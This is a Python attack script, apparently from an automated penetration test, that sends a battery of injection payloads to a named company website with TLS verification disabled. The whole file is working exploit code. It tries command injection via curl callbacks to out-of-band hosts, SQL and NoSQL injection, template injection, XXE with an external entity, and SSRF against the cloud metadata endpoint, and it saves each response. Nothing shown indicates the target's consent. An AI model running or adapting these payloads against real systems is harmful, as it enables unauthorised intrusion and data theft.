#!/usr/bin/env python3
import urllib.request, urllib.parse, ssl, os, json, time
O = "tool_outputs/inj_battery"
os.makedirs(O, exist_ok=True)
B = "https://www.infinitycapital.bh"
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36"

CM = "oob00e371b50d38.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
SQL = "oobba64005b9e73.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
NOS = "oobb0bb2d5963d0.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
SST = "oobd2a219353611.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

def req(name, url, data=None, method=None, headers=None, timeout=20):
    h = {"User-Agent": UA, "Accept": "*/*"}
    if headers: h.update(headers)
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=data, headers=h, method=method), timeout=timeout, context=ctx)
        body = r.read()
        code = r.getcode()
    except urllib.error.HTTPError as e:
        body = e.read(); code = e.code
    except Exception as e:
        body = str(e).encode(); code = -1
    with open(os.path.join(O, "out_"+name+".txt"), "wb") as f:
        f.write(body)
    ref = b"49" in body or b"oast.abhedi" in body or b"marker" in body.lower()
    print(f"{name:24s} code={code:5d} size={len(body):7d} interesting={ref}")
    return code, body

# --- CMDi on /api/send (form POST, msg field) ---
for n, p in [("cmdi_semi", ";curl http://%s/cmdi" % CM),
             ("cmdi_sub", "$(curl http://%s/cmdi)" % CM),
             ("cmdi_pipe", "|curl http://%s/cmdi" % CM),
             ("cmdi_bt", "`curl http://%s/cmdi`" % CM),
             ("cmdi_newline", "\ncurl http://%s/cmdi" % CM)]:
    form = urllib.parse.urlencode({"lname":"a","cname":"c","subject":"s","msg":p,"areacode":"9","tel":"1","check":"0","targets":"t"}).encode()
    req(n, B+"/api/send", data=form, method="POST", headers={"Content-Type":"application/x-www-form-urlencoded"})

# --- CMDi via _next/image url param ---
req("img_cmdi", B+"/_next/image?"+urllib.parse.urlencode({"url":";curl http://%s/cmdi"%CM,"w":"1080","q":"75"}))

# --- blind SQLi (DNS OOB) via _next/image url + q + w ---
req("img_sqli_url", B+"/_next/image?"+urllib.parse.urlencode({"url":"/logo.png' OR ''='","w":"1080","q":"75"}))
req("img_sqli_dns", B+"/_next/image?"+urllib.parse.urlencode({"url":"/logo.png' UNION SELECT LOAD_FILE(CONCAT(0x5c,(SELECT version())))-- -","w":"1080","q":"75"}))
req("img_sqli_w", B+"/_next/image?"+urllib.parse.urlencode({"url":"/logo.png","w":"1080 OR 1=1","q":"75"}))
req("img_sqli_q", B+"/_next/image?"+urllib.parse.urlencode({"url":"/logo.png","w":"1080","q":"75' AND SLEEP(5)-- -"}))

# --- NoSQLi ---
req("nosqli_ne",   B+"/api/?"+urllib.parse.urlencode({"id[$ne]":"zz"}))
req("nosqli_regex",B+"/api/?"+urllib.parse.urlencode({"id[$regex]":"^a"}))
req("nosqli_gt",   B+"/api/?"+urllib.parse.urlencode({"id[$gt]":""}))
req("nosqli_exists",B+"/api/?"+urllib.parse.urlencode({"id[$exists]":"true"}))
req("nosqli_json", B+"/api/", data=json.dumps({"id":{"$ne":None}}).encode(), method="POST", headers={"Content-Type":"application/json"})
req("nosqli_json2", B+"/api/contact", data=json.dumps({"email":{"$gt":""},"name":{"$ne":"x"}}).encode(), method="POST", headers={"Content-Type":"application/json"})

# --- SSTI ---
for tmpl in ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "${{7*7}}", "{{config}}"]:
    tag = tmpl.strip("{}<>$#%= ")
    req("ssti_"+tag[:10].replace(" ","_"), B+"/contact?"+urllib.parse.urlencode({"x":tmpl}))
    req("sstiQ_"+tag[:10].replace(" ","_"), B+"/_next/image?"+urllib.parse.urlencode({"url":tmpl,"w":"1080","q":"75"}))

# --- XXE on api/send + contact (XML body) ---
xxe = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://%s/xxe">]><r>&x;</r>' % CM
req("xxe_send", B+"/api/send", data=xxe.encode(), method="POST", headers={"Content-Type":"application/xml"})
req("xxe_send2", B+"/api/send", data=xxe.encode(), method="POST", headers={"Content-Type":"text/xml"})
req("xxe_contact", B+"/api/contact", data=xxe.encode(), method="POST", headers={"Content-Type":"application/xml"})

# --- SSRF via url params (metadata + localhost) ---
req("ssrf_meta_img", B+"/_next/image?"+urllib.parse.urlencode({"url":"http://169.254.169.254/latest/meta-data/","w":"1080","q":"75"}))
req("ssrf_oob_img",  B+"/_next/image?"+urllib.parse.urlencode({"url":"http://%s/ssrf"%CM,"w":"1080","q":"75"}))
print("=== BATTERY COMPLETE ===")
